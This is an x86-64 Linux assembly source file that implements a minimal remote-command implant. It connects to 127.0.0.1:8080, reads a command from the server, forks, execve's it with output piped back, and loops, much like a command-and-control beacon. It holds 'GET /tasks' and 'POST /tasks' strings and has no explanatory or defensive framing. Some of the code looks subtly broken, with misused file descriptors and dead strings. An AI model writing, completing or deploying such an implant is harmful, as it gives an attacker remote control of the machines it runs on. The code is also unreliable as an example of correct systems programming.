%macro clearBuffer 1
  mov     rcx,    0
%%_ne:
  mov     QWORD [%1 + rcx], 0
  add     rcx,    8
  cmp     rcx,    256
  jne     %%_ne
%endmacro

section .text
  global _start

_start:
  push    DWORD   0
  push    DWORD   0x0100007F
  push    WORD    0x901F
  push    WORD    2

_request:
  ; socket()
  mov     rax,    41
  mov     edi,    2
  mov     esi,    1
  xor     rdx,    rdx
  syscall

  ; connect()
_tryConnect:
  mov     rdi,    rax
  mov     rsi,    rsp
  mov     rdx,    DWORD 16
  mov     rax,    42
  syscall
  test    rax,    rax
  jz      _connOk
  mov     rax,    60
  xor     rdi,    rdi
  syscall

_connOk:
  inc     rax
  mov     rsi,    output
  mov     rdx,    0x400
  syscall

  ; read response
  xor     rax,    rax
  sub     rsp,    0x400
  mov     rsi,    rsp
  mov     rdx,    0x400
  syscall
  mov     r14,    rdi

  ; pipe()
  mov     rax,    22
  mov     rdi,    QWORD fds
  syscall

  ; fork()
  mov     rax,    57
  syscall
  mov     [pid],  rax

  test    rax,    rax
  jz      _childProc

_parentProc:
  ; close write end
  mov     rax,    3
  mov     rdi,    [fds+4]
  syscall

  clearBuffer output

  ; read()
  xor     rax,    rax
  mov     rdi,    [fds]
  mov     rsi,    output
  mov     rdx,    0x400
  syscall

  cmp     BYTE [output], 0
  jne     _continue
  mov     BYTE [output], 1

_continue:

  ; close read end
  mov     rax,    3
  mov     rdi,    [fds]
  syscall

  ; close connection
  mov     rax,    3
  mov     rdi,    r14
  syscall

  clearBuffer rsp
  add     rsp,    0x400

  jmp     _request

_childProc:
  ; dup2()
  mov     rax,    33
  mov     rdi,    [fds+4]
  mov     rsi,    1
  syscall
  ; close()
  mov     rax,    3
  mov     rdi,    fds
  syscall
  ; close()
  mov     rax,    3
  mov     rdi,    [fds+4]
  syscall

  ; execve()
  mov     rax,    59
  mov     rdi,    rsp
  xor     rsi,    rsi
  xor     rdx,    rdx
  syscall

  ; wait4()
  mov     rax,    61
  xor     rdi,    rdi
  xor     rsi,    rsi
  xor     rdi,    rdi
  xor     r10,    r10
  syscall

section .bss
  fds:    resd    2
  pid:    resd    1
  output: resb    0x400
  sockaddr: resq  2
  msgbuf: resb    0x400

section .data
  get_task_msg:
    db "GET /tasks HTTP/1.1", 0ah, 0ah, 0h
  get_task_len equ $ - get_task_msg
  response_msg:
    db "POST /tasks HTTP/1.1", 0ah, 0ah, 0h
  response_len equ $ - response_msg
